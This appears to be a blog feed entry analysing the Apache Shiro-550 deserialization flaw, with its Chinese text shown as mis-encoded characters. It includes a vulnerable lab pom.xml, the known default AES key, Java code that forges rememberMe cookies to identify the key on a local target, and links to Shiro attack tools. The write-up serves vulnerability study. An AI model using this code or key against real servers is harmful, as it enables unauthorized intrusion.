<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åƒæ¸…æ°´ä¸€èˆ¬æ¸…æ¾ˆé€æ˜</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://summersec.github.io/"/>
  <updated>2021-01-22T11:19:36.323Z</updated>
  <id>https://summersec.github.io/</id>
  
  <author>
    <name>Samny</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shiro-550ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <link href="https://summersec.github.io/2021/03/21/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://summersec.github.io/2021/03/21/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-21T11:01:42.000Z</published>
    <updated>2021-01-22T11:19:36.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>&emsp;&emsp; Shiroååºåˆ—åŒ–æ¼æ´ç›®å‰ä¸ºæ­¢æœ‰ä¸¤ä¸ªï¼ŒShiro-550<code>(Apache  Shiro &lt; 1.2.5)</code>å’ŒShiro-721<code>( Apache  Shiro &lt; 1.4.2 )</code>ã€‚è¿™ä¸¤ä¸ªæ¼æ´ä¸»è¦åŒºåˆ«åœ¨äºShiro550ä½¿ç”¨å·²çŸ¥å¯†é’¥æ’ï¼Œåè€…Shiro721æ˜¯ä½¿ç”¨<code>ç™»å½•årememberMe={value}å»çˆ†ç ´æ­£ç¡®çš„keyå€¼</code>è¿›è€Œååºåˆ—åŒ–ï¼Œå¯¹æ¯”Shiro550æ¡ä»¶åªè¦æœ‰<code>è¶³å¤Ÿå¯†é’¥åº“</code>ï¼ˆæ¡ä»¶æ¯”è¾ƒä½ï¼‰ã€Shiro721éœ€è¦ç™»å½•ï¼ˆè¦æ±‚æ¯”è¾ƒé«˜<del>é¸¡è‚‹</del>ï¼‰ã€‚</p><ul><li><code>Apache Shiro &lt; 1.4.2</code>é»˜è®¤ä½¿ç”¨<code>AES/CBC/PKCS5Padding</code>æ¨¡å¼</li><li><code>Apache Shiro &gt;= 1.4.2</code>é»˜è®¤ä½¿ç”¨<code>AES/GCM/PKCS5Padding</code>æ¨¡å¼</li></ul><hr><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>&emsp;&emsp; é‡‡ç”¨Mavenä»“åº“çš„å½¢å¼ï¼Œæºç æ”¾åœ¨<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">GitHub</a>ä¸Šï¼Œç›´æ¥ç”¨Ideaæ‰“å¼€å³å¯ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-deser<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        hutoolæ˜¯ä¸€æ¬¾ååˆ†å¼ºå¤§å·¥å…·åº“--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        å®˜ç½‘åœ°å€ https://www.hutool.cn/--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--         æ·»åŠ commons-collectionsä¾èµ–ä½œä¸º payload--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;commons-collections&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;4.0&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        // debugå‚æ•°</span><br><span class="line">            <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">                -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=5005</span><br><span class="line">            <span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line">`</span><br></pre></td></tr></table></figure><hr><h1 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h1><ul><li><p>è°ƒç”¨org\apache\shiro\mgt\DefaultSecurityManager.class#resolvePrincipalsæ–¹æ³•<code>è·å–rememberå‡­è¯</code></p><p><img src="https://img-blog.csdnimg.cn/20210120170900332.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>DefaultSecurityManager.class#getRememberedIdentityè°ƒç”¨æ–¹æ³•<code>è·å–rememberMeè®¤è¯çš„åºåˆ—åŒ–æ•°æ®</code><br><img src="https://img-blog.csdnimg.cn/20210120170957673.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>æ¥ç€è°ƒç”¨çˆ¶ç±»org\apache\shiro\mgt\AbstractRememberMeManager.class#getRememberedPrincipalsæ–¹æ³•åœ¨122è¡Œè°ƒç”¨<code>getRememberedSerializedIdentity</code>æ–¹æ³•è·å–cookieä¸­çš„å€¼<br><img src="https://img-blog.csdnimg.cn/20210120171218140.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç„¶åæ¥åˆ°org\apache\shiro\web\mgt\CookieRememberMeManager.class#getRememberedSerializedIdentityè·å–cookieå€¼ä¹‹åï¼Œå…ˆåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦ä¸ºç©ºå’Œ<code>deleteMe</code>ï¼Œè§£ä¹‹Base64è§£ç æœ€ååœ¨95è¡Œå¤„è¿”å›byte[]å€¼<br><img src="https://img-blog.csdnimg.cn/20210122145845874.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210122150020874.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>org\apache\shiro\mgt\AbstractRememberMeManager.class#getRememberedPrincipalsæ–¹æ³•çš„124è¡Œè¿›è¡Œç±»å‹è½¬åŒ–ï¼Œç±»å‹è½¬åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè¿›è¡ŒAESè§£å¯†æ“ä½œï¼Œè¿›è€Œä½œä¸ºååºåˆ—åŒ–çš„æ•°æ®<br><img src="https://img-blog.csdnimg.cn/20210122150415517.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>AbstractRememberMeManager.class#convertBytesToPrincipalsè¿›è¡ŒAESè§£å¯†æ“ä½œï¼Œæœ€åè°ƒç”¨ååºåˆ—åŒ–æ–¹æ³•ï¼Œå°†æ•°æ®ååºåˆ—åŒ–ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ¼æ´<br><img src="https://img-blog.csdnimg.cn/20210122150613761.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>AbstractRememberMeManager#decryptæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹bytesæ•°æ®å€¼ï¼Œå¯ä»¥çœ‹åˆ°è§£å¯†åæ˜¯ç”Ÿæˆçš„æ¶æ„payload</p><p><img src="https://img-blog.csdnimg.cn/20210122151026506.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>å®Œæ•´çš„payloadæ¼”ç¤ºæ•ˆæœ<br>  <img src="https://img-blog.csdnimg.cn/20210122191831440.gif" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li></ul><hr><h1 id="Shiroâ€˜s-keyçˆ†ç ´æ–¹å¼"><a href="#Shiroâ€˜s-keyçˆ†ç ´æ–¹å¼" class="headerlink" title="Shiroâ€˜s keyçˆ†ç ´æ–¹å¼"></a>Shiroâ€˜s keyçˆ†ç ´æ–¹å¼</h1><h2 id="åŸºäºåŸç”Ÿshiroæ¡†æ¶æ£€æµ‹æ–¹å¼"><a href="#åŸºäºåŸç”Ÿshiroæ¡†æ¶æ£€æµ‹æ–¹å¼" class="headerlink" title="åŸºäºåŸç”Ÿshiroæ¡†æ¶æ£€æµ‹æ–¹å¼"></a>åŸºäºåŸç”Ÿshiroæ¡†æ¶æ£€æµ‹æ–¹å¼</h2><p>l1nk3rå¸ˆå‚…çš„æ£€æµ‹æ€è·¯åœ°å€: <a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a><br>å…³é”®ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">       ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"payload"</span>));</span><br><span class="line">       obj.writeObject(simplePrincipalCollection);</span><br><span class="line">       obj.close();</span><br></pre></td></tr></table></figure><p>å®ç°å…·ä½“ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// æ­£ç¡®key</span></span><br><span class="line">        String realkey = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>;</span><br><span class="line">        <span class="comment">// é”™è¯¯key</span></span><br><span class="line">        String errorkey = <span class="string">"2AvVhdsgUs0FSA3SDFAdag=="</span>;</span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        String filepath = <span class="string">"E:\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\key"</span>;</span><br><span class="line"></span><br><span class="line">        SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(filepath));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å†™å…¥åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">            obj.writeObject(simplePrincipalCollection);</span><br><span class="line">            obj.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        FileReader fileReader = <span class="keyword">new</span> FileReader(filepath);</span><br><span class="line"></span><br><span class="line">        CbcEncrypt cbcEncrypt = <span class="keyword">new</span> CbcEncrypt();</span><br><span class="line">        String realcookie = <span class="string">"rememberMe="</span> + cbcEncrypt.encrypt(realkey,fileReader.readBytes());</span><br><span class="line">        String errorcookie = <span class="string">"rememberMe="</span> + cbcEncrypt.encrypt(errorkey,fileReader.readBytes());</span><br><span class="line">        System.out.println(<span class="string">"realcookie --&gt; "</span> + realcookie);</span><br><span class="line">        System.out.println(<span class="string">"errorcookie --&gt; "</span> + errorcookie);</span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8001/index"</span>;</span><br><span class="line">        <span class="comment">// å‘é€è¯·æ±‚åŒ…ï¼Œè·å–è¿”å›åŒ…</span></span><br><span class="line">        HttpResponse realresponse = HttpRequest.get(url).cookie(realcookie).execute();</span><br><span class="line">        HttpResponse errorresponse = HttpRequest.get(url).cookie(errorcookie).execute();</span><br><span class="line">        String result1 = realresponse.header(Header.SET_COOKIE);</span><br><span class="line">        String result2 = errorresponse.header(Header.SET_COOKIE);</span><br><span class="line">        <span class="comment">// è¾“å‡ºç»“æœ</span></span><br><span class="line">        System.out.println(<span class="string">"realkey ---&gt; "</span> + result1);</span><br><span class="line">        System.out.println(<span class="string">"errorkey ---&gt; "</span> + result2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210122190937627.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>&emsp;&emsp; Gadget Chian å¦‚ä¸‹ã€‚ç®€å•æ¥è¯´æµç¨‹å°±æ˜¯å°†ç”Ÿæˆæ¶æ„Payloadè¿›è¡ŒAESåŠ å¯†ï¼Œç„¶åBase64ç¼–ç ï¼Œç„¶åä»¥<code>rememberMe={value}</code>å½¢å¼å‘é€ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨å°†<code>value</code>Base64è§£ç ï¼Œç„¶åå°†è§£ç åæ•°æ®è¿›è¡ŒAESè§£å¯†ï¼Œæœ€åååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤ã€‚<br>&emsp;&emsp; Shiro721åœ¨ç™»å½•ä¹‹åï¼Œç”¨ç™»å½•åæœåŠ¡å™¨ç”ŸæˆrememberMeçš„å€¼è¿›è¡ŒBase64è§£ç ä¹‹åï¼Œç”¨è§£ç æ•°æ®ï¼Œå†é€šè¿‡<code>Padding Oracle Attack</code>è¿›è¡Œçˆ†ç ´å¾—åˆ°keyå…·ä½“å‚è€ƒ<a href="https://paper.seebug.org/1378/#412-apache-shiro-padding-oracle-attack" target="_blank" rel="noopener">Shiro ç»„ä»¶æ¼æ´ä¸æ”»å‡»é“¾åˆ†æ</a>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*                  Gadget chian:</span><br><span class="line">*                      DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">*                          DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">*                              AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">*                                  CookieRememberMeManager#getRememberedSerializedIdentity()</span><br><span class="line">*                                      AbstractRememberMeManager#getRememberedPrincipals()</span><br><span class="line">*                                          AbstractRememberMeManager.convertBytesToPrincipals()</span><br><span class="line">*                                              AbstractRememberMeManager.decrypt()</span><br><span class="line">*                                                  AbstractRememberMeManager.deserialize()</span><br><span class="line">*                                                      .....................</span><br><span class="line">*                                                               ..........</span><br><span class="line">*  </span><br><span class="line">*</span><br></pre></td></tr></table></figure><hr><h2 id="Shiroå®ç”¨å·¥å…·æ¨è"><a href="#Shiroå®ç”¨å·¥å…·æ¨è" class="headerlink" title="Shiroå®ç”¨å·¥å…·æ¨è"></a>Shiroå®ç”¨å·¥å…·æ¨è</h2><ul><li><a href="https://github.com/j1anFen/shiro_attack" target="_blank" rel="noopener">shiro_attack</a> æ¨èç†ç”±ï¼šjavafxå†™çš„UIï¼Œæ”¯æŒtomcatå…¨ç‰ˆæœ¬å›æ˜¾å’ŒSpring Bootå›æ˜¾ã€‚ä½¿ç”¨<code>SimplePrincipalCollection</code>çˆ†ç ´keyï¼Œæ”¯æŒé«˜ç‰ˆæœ¬åŠ å¯†æ–¹å¼çˆ†ç ´ï¼ˆGCMæ¨¡å¼ï¼‰é¡¹ç›®è¿˜åœ¨ç»´æŠ¤ã€‚<br><img src="https://img-blog.csdnimg.cn/20210122183413881.png" alt></li></ul><hr><ul><li><a href="https://github.com/pmiaowu/BurpShiroPassiveScan" target="_blank" rel="noopener">BurpShiroPassiveScan</a>æ˜¯ä¸€æ¬¾burpæ’ä»¶ï¼Œè¢«åŠ¨å¼æ‰«æï¼Œè‡ªåŠ¨è¯†åˆ«æ˜¯å¦ä¸ºshiroæ¡†æ¶ï¼Œæ”¯æŒCBC/GCMä¸¤ç§åŠ å¯†æ–¹å¼ï¼ŒåŒæ—¶é»˜è®¤ä½¿ç”¨<code>SimplePrincipalCollection</code>çˆ†ç ´keyï¼Œé¡¹ç›®åœ¨ç»´æŠ¤ã€‚<br><img src="https://img-blog.csdnimg.cn/2021012218384769.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><hr><h2 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h2><h3 id="ç¼–ç ä¸ä¸€è‡´é—®é¢˜"><a href="#ç¼–ç ä¸ä¸€è‡´é—®é¢˜" class="headerlink" title="ç¼–ç ä¸ä¸€è‡´é—®é¢˜"></a>ç¼–ç ä¸ä¸€è‡´é—®é¢˜</h3><p>ç”±äºWindows cmdçš„ç¼–ç æ˜¯gdkï¼Œå¯¼è‡´è¯»å–cmdå†…å®¹çš„æ—¶å€™ä¼š<code>aced0005</code>å˜æˆ<code>efbfbdefbfbd</code>ï¼Œå¯¼è‡´æ— æ³•ååºåˆ—åŒ–ã€‚<br><img src="https://img-blog.csdnimg.cn/20210120125258810.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§£å†³åŠæ³•å°†ç”Ÿæˆçš„payloadå¯¼å…¥æ–‡ä»¶ä¹‹ä¸­ï¼Œç„¶åè¯»å–äºŒè¿›åˆ¶æ•°æ®ã€‚<br><img src="https://img-blog.csdnimg.cn/20210122171101605.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h2 id="è¯¾å¤–çŸ¥è¯†è¡¥å……"><a href="#è¯¾å¤–çŸ¥è¯†è¡¥å……" class="headerlink" 